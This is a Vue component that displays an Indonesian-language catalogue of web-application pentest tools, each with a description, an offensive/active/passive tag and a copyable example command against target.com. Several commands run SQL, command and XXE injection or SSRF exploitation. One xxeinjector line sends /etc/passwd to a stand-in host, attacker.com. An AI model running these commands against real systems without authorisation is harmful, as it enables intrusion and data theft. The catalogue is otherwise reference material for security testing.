<script setup>
import { ref } from 'vue'

const isExpanded = ref(true)
const copiedIndex = ref(null)

const copyCommand = (cmd, index) => {
  navigator.clipboard.writeText(cmd)
  copiedIndex.value = index
  setTimeout(() => {
    copiedIndex.value = null
  }, 2000)
}

const getTagStyle = (tag) => {
  switch (tag.toLowerCase()) {
    case 'offensive':
      return 'bg-red-500/10 text-red-400 border-red-500/20'
    case 'defensive':
      return 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20'
    case 'analysis':
      return 'bg-amber-500/10 text-amber-400 border-amber-500/20'
    case 'active':
      return 'bg-cyan-500/10 text-cyan-400 border-cyan-500/20'
    case 'passive':
      return 'bg-blue-500/10 text-blue-400 border-blue-500/20'
    default:
      return 'bg-gray-500/10 text-gray-400 border-gray-500/20'
  }
}

const tools = ref([
  { name: 'nuclei', desc: 'Scanner kerentanan berbasis template YAML yang sangat cepat, dikembangkan oleh komunitas untuk deteksi kerentanan spesifik.', cmd: 'nuclei -u https://target.com -t cves/', tag: 'Active' },
  { name: 'dalfox', desc: 'Scanner XSS otomatis dan fuzzer parameter yang cepat dan bertenaga berbasis Go.', cmd: 'dalfox url https://target.com/page?q=1', tag: 'Offensive' },
  { name: 'arjun', desc: 'Menemukan parameter HTTP tersembunyi untuk input GET/POST dengan tingkat akurasi tinggi menggunakan analisis heuristik.', cmd: 'arjun -u https://target.com/page', tag: 'Active' },
  { name: 'paramspider', desc: 'Menemukan parameter URL target dari arsip internet tanpa berinteraksi langsung dengan target.', cmd: 'paramspider -d target.com', tag: 'Passive' },
  { name: 'xsstrike', desc: 'Scanner XSS tingkat lanjut dengan intelligent payload generator yang dapat menembus WAF.', cmd: 'xsstrike -u "https://target.com/page?q=1"', tag: 'Offensive' },
  { name: 'gau', desc: 'Get All URLs — mengambil semua URL yang diketahui dari AlienVault, Wayback Machine, dan Common Crawl.', cmd: 'gau target.com', tag: 'Passive' },
  { name: 'waybackurls', desc: 'Fetch semua URL yang pernah direkam oleh Internet Archive Wayback Machine untuk menemukan endpoint usang.', cmd: 'waybackurls target.com', tag: 'Passive' },
  { name: 'kiterunner', desc: 'API discovery tool yang secara brutal melakukan bruteforce endpoint RESTful API berbasis dataset rute yang cerdas.', cmd: 'kr scan https://target.com -w routes-large.kite', tag: 'Active' },
  { name: 'feroxbuster', desc: 'Directory discovery tool yang sangat cepat, ditulis di Rust, dengan fitur rekursi otomatis yang powerful.', cmd: 'feroxbuster -u https://target.com -w wordlist.txt', tag: 'Active' },
  { name: 'dirsearch', desc: 'Web path scanner berbasis Python yang populer untuk menemukan direktori dan file tersembunyi.', cmd: 'dirsearch -u https://target.com', tag: 'Active' },
  { name: 'droopescan', desc: 'Scanner berbasis plugin untuk menemukan kerentanan pada CMS seperti Drupal, SilverStripe, dan WordPress.', cmd: 'droopescan scan drupal -u https://target.com', tag: 'Active' },
  { name: 'cmseek', desc: 'CMS Detection and Exploitation suite — mendeteksi ratusan CMS dan menjalankan modul exploit spesifik jika ditemukan.', cmd: 'cmseek -u https://target.com --follow-redirect', tag: 'Active' },
  { name: 'gitleaks', desc: 'Memindai repositori git web untuk menemukan hardcoded secrets seperti API keys, password, dan token.', cmd: 'gitleaks detect --source . --report-format json', tag: 'Analysis' },
  { name: 'corsy', desc: 'Scanner ringan untuk mendeteksi miskonfigurasi Cross-Origin Resource Sharing (CORS) pada aplikasi web.', cmd: 'python3 corsy.py -u https://target.com', tag: 'Analysis' },
  { name: 'tplmap', desc: 'Eksploitasi Server-Side Template Injection (SSTI) otomatis untuk mendeteksi kerentanan pada template engine web.', cmd: 'tplmap -u "https://target.com/page?name=1"', tag: 'Offensive' },

  // Mobile Web & API
  { name: 'mitmweb', desc: 'Versi web UI dari mitmproxy — mencegat dan memodifikasi traffic HTTP/HTTPS melalui antarmuka browser yang intuitif, sangat berguna untuk analisis API mobile dan web application testing tanpa perlu hafal command line.', cmd: 'mitmweb --listen-port 8080', tag: 'Offensive' },
  { name: 'postman', desc: 'Platform testing API yang sangat populer — mengirim request HTTP custom, mengelola collection endpoint, menulis test otomatis, dan mendokumentasikan API, sering digunakan pentester untuk explorasi dan fuzzing endpoint API target.', cmd: 'postman', tag: 'Active' },
  { name: 'insomnia', desc: 'REST dan GraphQL API client open source — alternatif Postman yang ringan untuk berinteraksi dengan API, mengirim request dengan berbagai autentikasi, dan menganalisis respons selama web application penetration testing.', cmd: 'insomnia', tag: 'Active' },

  // Injection & Exploitation
  { name: 'xsshunter', desc: 'Platform deteksi Blind XSS — menyediakan payload khusus yang akan melaporkan kembali ke server attacker ketika dieksekusi di browser admin atau internal, sangat efektif untuk menemukan stored XSS yang tidak langsung terlihat hasilnya.', cmd: 'xsshunter', tag: 'Offensive' },
  { name: 'sqlmc', desc: 'SQL injection mass checker — memindai seluruh domain secara rekursif untuk menemukan parameter yang rentan terhadap SQL injection, efektif untuk bug bounty dan assessment skala besar terhadap banyak endpoint sekaligus.', cmd: 'sqlmc -u https://target.com -d 3', tag: 'Offensive' },
  { name: 'ghauri', desc: 'Advanced SQL injection detection dan exploitation tool modern — alternatif sqlmap dengan teknik bypass WAF yang lebih canggih, mendukung berbagai DBMS dan teknik injeksi termasuk time-based blind pada aplikasi yang sangat diproteksi.', cmd: 'ghauri -u "https://target.com/page?id=1" --dbs', tag: 'Offensive' },

  // Recon & Discovery
  { name: 'cariddi', desc: 'Web crawler untuk endpoint dan secret discovery — merayapi website target secara rekursif untuk menemukan parameter tersembunyi, file sensitif, API key yang bocor, dan endpoint yang tidak terdokumentasi dalam satu tool yang ringan.', cmd: 'cariddi -s -e -ext 4 https://target.com', tag: 'Active' },
  { name: 'hakcheckurl', desc: 'Tool validasi URL massal yang cepat — mengecek status, redirect, dan respons dari ribuan URL sekaligus, berguna untuk memfilter hasil crawling dan memfokuskan pengujian hanya pada endpoint yang aktif dan merespons.', cmd: 'cat urls.txt | hakcheckurl', tag: 'Active' },
  { name: 'unfurl', desc: 'URL analysis dan deconstruction tool — membongkar dan menganalisis struktur URL secara mendalam termasuk parameter tersembunyi, encoding, dan metadata yang sering mengandung informasi sensitif tentang arsitektur aplikasi target.', cmd: 'echo "https://target.com/page?a=1" | unfurl keys', tag: 'Passive' },

  // Authentication Testing
  { name: 'oauth-toolkit', desc: 'Burp Suite extension khusus untuk testing implementasi OAuth 2.0 dan OpenID Connect — memudahkan pengujian kerentanan umum seperti authorization code interception, CSRF pada OAuth flow, dan token leakage pada aplikasi web modern.', cmd: 'burpsuite', tag: 'Offensive' },
  { name: 'saml-raider', desc: 'Burp Suite extension untuk testing keamanan SAML — memodifikasi request dan respons SAML secara interaktif untuk menguji kerentanan seperti XML signature wrapping, XXE dalam SAML assertion, dan bypass autentikasi SSO.', cmd: 'burpsuite', tag: 'Offensive' },

  // Header & Config Testing
  { name: 'shcheck', desc: 'Security header checker — menganalisis HTTP response header dari web server untuk mendeteksi header keamanan yang hilang atau salah konfigurasi seperti CSP, HSTS, X-Frame-Options, dan Permissions-Policy.', cmd: 'python3 shcheck.py https://target.com', tag: 'Analysis' },
  { name: 'headers', desc: 'Tool analisis HTTP security header yang ringan — memvalidasi implementasi header keamanan penting pada aplikasi web target dan memberikan rekomendasi perbaikan berdasarkan best practice OWASP dan standar keamanan modern.', cmd: 'python3 headers.py -u https://target.com', tag: 'Analysis' },

  // Prototype & Cache Attack
  { name: 'ppfuzz', desc: 'Prototype Pollution fuzzer otomatis — menguji aplikasi web berbasis JavaScript/Node.js untuk kerentanan prototype pollution yang dapat menyebabkan remote code execution, privilege escalation, atau bypass mekanisme keamanan aplikasi.', cmd: 'ppfuzz -l urls.txt', tag: 'Offensive' },
  { name: 'web-cache-vulnerability-scanner', desc: 'Scanner otomatis untuk kerentanan web cache poisoning — menguji apakah cache server dapat dimanipulasi untuk menyajikan respons berbahaya kepada pengguna lain melalui manipulasi header dan parameter yang tidak divalidasi dengan benar.', cmd: 'wcvs -u https://target.com -v', tag: 'Offensive' },

  // Subdomain & Virtual Host
  { name: 'vhostbrute', desc: 'Virtual host brute force tool — menemukan virtual host tersembunyi yang berjalan di IP yang sama dengan mengirim request HTTP dengan berbagai nilai header Host, sering mengungkap aplikasi internal yang tidak terdaftar secara publik.', cmd: 'vhostbrute -d target.com -w vhosts.txt', tag: 'Active' },
  { name: 'hosthunter', desc: 'Virtual host discovery tool menggunakan OSINT dan certificate transparency logs — menemukan semua hostname dan virtual host yang terhubung ke IP target tanpa melakukan brute force, sehingga lebih stealthy dan tidak memicu alarm.', cmd: 'python3 hosthunter.py target_ips.txt', tag: 'Passive' },
  { name: 'ctfr', desc: 'Memanfaatkan Certificate Transparency logs untuk enumerasi subdomain — mengambil semua subdomain yang pernah diterbitkan sertifikat SSL-nya dari database crt.sh secara cepat tanpa melakukan DNS bruteforce sama sekali.', cmd: 'python3 ctfr.py -d target.com', tag: 'Passive' },

  // Reconnaissance & Fingerprinting
  { name: 'httprint', desc: 'Fingerprinting web server berdasarkan respon HTTP — mendeteksi Apache, Nginx, IIS, dll meski versinya disembunyikan oleh administrator.', cmd: 'httprint -h https://target.com -s signatures.txt', tag: 'Passive' },
  { name: 'webanalyze', desc: 'Deteksi teknologi web seperti WhatWeb tapi lebih cepat dan bisa dijalankan massal terhadap banyak target sekaligus.', cmd: 'webanalyze -host target.com -apps apps.json', tag: 'Passive' },
  { name: 'wapiti', desc: 'Web vulnerability scanner yang crawl seluruh halaman web lalu uji setiap parameter yang ditemukan terhadap berbagai serangan.', cmd: 'wapiti -u https://target.com -o report', tag: 'Active' },
  { name: 'uniscan', desc: 'Scanner sederhana namun efektif untuk menemukan file/direktori sensitif, RFI, LFI, dan blind SQL injection pada web target.', cmd: 'uniscan -u https://target.com -qweds', tag: 'Active' },

  // Injection Attacks
  { name: 'nosqlmap', desc: 'Seperti sqlmap tapi khusus untuk database NoSQL seperti MongoDB dan CouchDB — otomasi deteksi dan eksploitasi injection.', cmd: 'python3 nosqlmap.py -u "https://target.com/login" --attack 2', tag: 'Offensive' },
  { name: 'bbqsql', desc: 'Blind SQL injection exploitation framework yang sangat berguna ketika sqlmap tidak bisa bekerja pada kasus edge tertentu.', cmd: 'python3 bbqsql.py -u "https://target.com/page?id=1"', tag: 'Offensive' },
  { name: 'jsql-injection', desc: 'Tool GUI berbasis Java untuk deteksi dan eksploitasi SQL injection secara otomatis dengan tampilan visual yang ramah pemula.', cmd: 'java -jar jsql-injection.jar', tag: 'Offensive' },

  // Directory & Content Discovery
  { name: 'dirbuster', desc: 'Directory brute force GUI dari OWASP — memiliki wordlist bawaan yang besar dan visualisasi hasil yang jelas untuk pemula.', cmd: 'dirbuster', tag: 'Active' },
  { name: 'rustbuster', desc: 'Directory dan vhost brute force super cepat berbasis Rust — alternatif modern feroxbuster dengan fitur tambahan yang lengkap.', cmd: 'rustbuster dir -u https://target.com -w wordlist.txt', tag: 'Active' },
  { name: 'meg', desc: 'Fetch banyak path dari banyak host secara paralel — efisien untuk pengecekan endpoint massal tanpa membebani server target.', cmd: 'meg /paths.txt hosts.txt out/', tag: 'Active' },
  { name: 'gospider', desc: 'Web spider berbasis Go yang sangat cepat untuk crawl link, form, dan endpoint JavaScript dari halaman web target.', cmd: 'gospider -s https://target.com -d 3 -c 10', tag: 'Active' },

  // Authentication & Session
  { name: 'jwt-tool', desc: 'Analisis, dekode, dan exploit JSON Web Token — menguji kelemahan seperti algorithm confusion, none attack, dan secret brute force.', cmd: 'jwt_tool eyJ... -T', tag: 'Offensive' },
  { name: 'sessionprobe', desc: 'Menganalisis dan membandingkan respon endpoint saat authenticated vs unauthenticated untuk menemukan broken access control.', cmd: 'sessionprobe -url https://target.com -tokens tokens.txt', tag: 'Offensive' },
  { name: 'owtf', desc: 'Offensive Web Testing Framework dari OWASP — mengotomasi pengujian berdasarkan metodologi OWASP Testing Guide secara terstruktur.', cmd: 'python3 owtf.py -t https://target.com', tag: 'Offensive' },

  // Specific Vulnerability
  { name: 'ssrfmap', desc: 'Otomasi deteksi dan eksploitasi Server-Side Request Forgery (SSRF) — mencoba berbagai bypass dan payload terhadap parameter target.', cmd: 'ssrfmap -u "https://target.com/page?url=FUZZ"', tag: 'Offensive' },
  { name: 'gopherus', desc: 'Generate payload Gopher protocol untuk eksploitasi SSRF lebih dalam — bisa digunakan untuk pivot ke Redis, MySQL, dan SMTP.', cmd: 'python2 gopherus.py --exploit redis', tag: 'Offensive' },
  { name: 'xxeinjector', desc: 'Otomasi eksploitasi XXE (XML External Entity) injection — mendukung berbagai teknik exfiltration data via XXE secara otomatis.', cmd: 'ruby xxeinjector.rb --host=attacker.com --path=/etc/passwd --file=req.txt', tag: 'Offensive' },
  { name: 'xsrfprobe', desc: 'Audit dan eksploitasi kerentanan CSRF (Cross-Site Request Forgery) secara otomatis pada form dan endpoint web target.', cmd: 'xsrfprobe -u https://target.com --crawl', tag: 'Offensive' },
  { name: 'liffy', desc: 'Eksploitasi Local File Inclusion (LFI) — mencoba berbagai teknik bypass filter untuk membaca file sensitif di server target.', cmd: 'python3 liffy.py -u "https://target.com/page?file=FUZZ"', tag: 'Offensive' },

  // CMS & Framework Specific
  { name: 'magescan', desc: 'Scanner kerentanan khusus untuk toko online berbasis Magento — deteksi versi, modul vulnerable, dan konfigurasi yang buruk.', cmd: 'magescan scan:all https://target.com', tag: 'Active' },
  { name: 'typo3scan', desc: 'Scanner untuk CMS TYPO3 — enumerasi versi, extension yang terinstall, dan kerentanan yang diketahui pada instalasi TYPO3.', cmd: 'python3 typo3scan.py -d https://target.com', tag: 'Active' },
  { name: 'arachni', desc: 'Web application security scanner framework yang powerful dengan GUI dan CLI — cocok untuk audit mendalam aplikasi web modern.', cmd: 'arachni https://target.com --report-save-path=report.afr', tag: 'Active' },

  // API Testing
  { name: 'restler', desc: 'Fuzzer REST API otomatis dari Microsoft Research — mencoba urutan request yang logis untuk menemukan bug keamanan di API.', cmd: 'restler compile --api_spec openapi.json && restler fuzz', tag: 'Offensive' },
  { name: 'graphqlmap', desc: 'Tool untuk enumerasi dan eksploitasi endpoint GraphQL — introspeksi schema, inject query berbahaya, dan bypass authorization.', cmd: 'python3 graphqlmap.py -u https://target.com/graphql', tag: 'Offensive' },
  { name: 'apicheck', desc: 'Validasi dan testing keamanan REST API — mengecek authentication, rate limiting, dan input validation pada setiap endpoint API.', cmd: 'acheck -F openapi-file.yaml', tag: 'Active' },
  { name: 'burpsuite', desc: 'Platform lengkap untuk web security testing — proxy interceptor, scanner, repeater, intruder, dan decoder dalam satu suite.', cmd: 'burpsuite', tag: 'Offensive' },
  { name: 'ffuf', desc: 'Fast Fuzzing — tool fuzzer web yang ditulis dalam bahasa Go, terkenal sangat cepat dan fleksibel untuk directory discovery, vhost discovery, dan fuzzing parameter.', cmd: 'ffuf -u https://target.com/FUZZ -w wordlist.txt', tag: 'Active' },
  { name: 'nikto', desc: 'Web server scanner untuk menemukan file berbahaya, konfigurasi salah, versi software usang, dan 6700+ masalah keamanan.', cmd: 'nikto -h https://target.com', tag: 'Active' },
  { name: 'sqlmap', desc: 'Otomasi deteksi dan eksploitasi SQL injection — mendukung semua DBMS populer dan dapat dump database secara penuh.', cmd: 'sqlmap -u "https://target.com/page?id=1" --dbs', tag: 'Offensive' },
  { name: 'dirb', desc: 'Directory dan file brute force pada web server menggunakan wordlist untuk menemukan konten tersembunyi.', cmd: 'dirb https://target.com', tag: 'Active' },
  { name: 'gobuster', desc: 'Directory/file/DNS/vhost brute force yang cepat menggunakan concurrency. Alternatif modern dari dirb.', cmd: 'gobuster dir -u https://target.com -w wordlist.txt', tag: 'Active' },
  { name: 'wfuzz', desc: 'Web application fuzzer untuk menemukan parameter tersembunyi, directory, script, dan kerentanan melalui injeksi payload.', cmd: 'wfuzz -u https://target.com/FUZZ -w wordlist.txt', tag: 'Active' },
  { name: 'zaproxy', desc: 'OWASP ZAP — open source web application security scanner dengan proxy, spider, dan active/passive scanner.', cmd: 'zaproxy', tag: 'Offensive' },
  { name: 'whatweb', desc: 'Fingerprinting teknologi web — mengidentifikasi CMS, framework, library, server, dan plugin yang digunakan website.', cmd: 'whatweb https://target.com', tag: 'Passive' },
  { name: 'wafw00f', desc: 'Deteksi dan fingerprinting Web Application Firewall (WAF) yang melindungi target sebelum melakukan serangan.', cmd: 'wafw00f https://target.com', tag: 'Passive' },
  { name: 'skipfish', desc: 'Web application security scanner aktif dari Google — menghasilkan sitemap interaktif dan laporan kerentanan.', cmd: 'skipfish -o output/ https://target.com', tag: 'Active' },
  { name: 'wpscan', desc: 'WordPress security scanner — enumerasi user, plugin vulnerable, tema, dan konfigurasi berbahaya pada situs WordPress.', cmd: 'wpscan --url https://target.com --enumerate u,p', tag: 'Active' },
  { name: 'joomscan', desc: 'Scanner kerentanan untuk CMS Joomla — deteksi versi, komponen vulnerable, dan konfigurasi tidak aman.', cmd: 'joomscan --url https://target.com', tag: 'Active' },
  { name: 'xsser', desc: 'Automated framework untuk deteksi dan eksploitasi kerentanan Cross-Site Scripting (XSS) pada aplikasi web.', cmd: 'xsser -u "https://target.com/page?q=1"', tag: 'Offensive' },
  { name: 'hakrawler-v2', desc: 'Versi modern hakrawler dengan dukungan JavaScript rendering — crawling endpoint tersembunyi di SPA modern lebih dalam dari versi sebelumnya.', cmd: 'echo https://target.com | hakrawler -js -linkfinder', tag: 'Active' },
  { name: 'jaeles', desc: 'Framework testing keamanan web yang powerful berbasis signature — mengirim request HTTP custom dan memvalidasi respons terhadap pola kerentanan yang telah didefinisikan.', cmd: 'jaeles scan -u https://target.com -s signatures/', tag: 'Offensive' },
  { name: 'commix', desc: 'Otomasi deteksi dan eksploitasi command injection — mencoba berbagai teknik bypass untuk mengeksekusi perintah OS.', cmd: 'commix -u "https://target.com/page?cmd=whoami"', tag: 'Offensive' }
])
</script>

<template>
  <section class="bg-[#121212] border border-gray-800/80 rounded-xl overflow-hidden transition-all duration-300">
    <!-- Header Section (Accordion Toggle) -->
    <button 
      @click="isExpanded = !isExpanded"
      class="w-full flex items-center justify-between p-5 bg-[#161616] hover:bg-[#1a1a1a] transition-colors border-b border-gray-800/50"
    >
      <div class="flex items-center gap-3">
        <span class="text-xl">🌐</span>
        <h2 class="text-lg md:text-xl font-bold text-white tracking-wide">
          Web Application
        </h2>
        <span class="text-xs px-2.5 py-0.5 rounded-full font-semibold bg-[#42b883]/10 text-[#42b883] border border-[#42b883]/20">
          {{ tools.length }} tools
        </span>
      </div>
      <span class="text-gray-400 text-sm transform transition-transform duration-200" :class="{ 'rotate-180': isExpanded }">
        ▼
      </span>
    </button>

    <!-- Grid Card Tools -->
    <div v-show="isExpanded" class="p-6 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
      <div 
        v-for="(tool, index) in tools" 
        :key="index"
        class="group relative bg-[#181818] border border-gray-800 rounded-lg p-5 flex flex-col justify-between transition-all duration-300 hover:-translate-y-1 hover:border-[#42b883] hover:shadow-[0_0_20px_rgba(66,184,131,0.2)]"
      >
        <div>
          <!-- Header Card (Nama + Tag) -->
          <div class="flex items-center justify-between mb-3">
            <h3 class="font-bold text-lg text-white group-hover:text-[#42b883] transition-colors font-mono truncate mr-2">
              {{ tool.name }}
            </h3>
            <span 
              class="text-[10px] px-2 py-0.5 font-bold uppercase rounded tracking-wider border flex-shrink-0"
              :class="getTagStyle(tool.tag)"
            >
              {{ tool.tag }}
            </span>
          </div>

          <!-- Deskripsi Tool -->
          <p class="text-gray-400 text-xs leading-relaxed mb-4">
            {{ tool.desc }}
          </p>
        </div>

        <!-- Terminal Command Box -->
        <div class="mt-2 pt-3 border-t border-gray-800/60">
          <div class="flex items-center justify-between bg-[#0e0e0e] border border-gray-800 rounded p-2 text-xs font-mono">
            <code class="text-emerald-400 truncate mr-2 font-mono" :title="tool.cmd">
              {{ tool.cmd }}
            </code>
            <button 
              @click="copyCommand(tool.cmd, index)"
              class="text-gray-400 hover:text-white px-2 py-1 rounded bg-gray-800/50 hover:bg-gray-700 text-[10px] transition-colors flex-shrink-0"
            >
              {{ copiedIndex === index ? 'Copied!' : 'Copy' }}
            </button>
          </div>
        </div>
      </div>
    </div>
  </section>
</template>
